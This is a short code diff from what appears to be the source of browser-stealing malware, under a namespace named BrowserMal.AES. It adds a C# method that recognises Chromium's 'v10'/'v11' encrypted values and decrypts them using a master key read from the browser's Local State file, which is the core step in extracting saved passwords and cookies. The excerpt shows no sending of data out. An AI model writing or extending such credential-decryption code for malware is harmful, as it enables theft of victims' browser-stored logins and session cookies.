@@ -48,6 +48,17 @@ namespace BrowserMal.AES
             return null;
         }
 
+        public static string GetEncryptedValue(string encrypted, byte[] masterKey)
+        {
+            if (encrypted.StartsWith("v10") || encrypted.StartsWith("v11"))
+            {
+                Prepare(Encoding.Default.GetBytes(encrypted), out byte[] nonce, out byte[] ciphertextTag);
+                return Decrypt(ciphertextTag, masterKey, nonce);
+            }
+
+            return DecryptNoKey(Encoding.Default.GetBytes(encrypted));
+        }
+
         public static byte[] GetMasterKey(string basePath)
         {
             string path = FindLocalState(basePath);
